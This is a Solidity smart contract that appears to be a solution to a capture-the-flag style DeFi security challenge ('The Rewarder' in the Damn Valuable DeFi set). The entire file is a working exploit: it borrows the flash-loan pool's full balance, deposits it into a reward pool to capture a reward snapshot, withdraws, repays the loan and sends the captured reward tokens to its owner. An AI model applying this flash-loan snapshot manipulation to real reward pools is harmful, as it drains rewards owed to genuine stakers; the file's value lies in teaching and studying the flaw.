// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../DamnValuableToken.sol";
import "../TheRewarderPool.sol";
import "../FlashLoanerPool.sol";
import "../RewardToken.sol";

/**
 * @title AttackerC5
 * @author Georgi Nikolaev Georgiev
 */
contract AttackerC5 {
    address immutable owner;

    DamnValuableToken immutable liquidityToken;
    RewardToken immutable rewardToken;
    TheRewarderPool immutable rewarderPool;
    FlashLoanerPool immutable flashLoanerPool;

    constructor(
        address _liquidityToken,
        address _rewardToken,
        address _rewarderPool,
        address _flashLoanerPool
    ) {
        owner = msg.sender;
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
    }

    function exploit() external {
        flashLoanerPool.flashLoan(
            liquidityToken.balanceOf(address(flashLoanerPool))
        );
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanerPool));
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
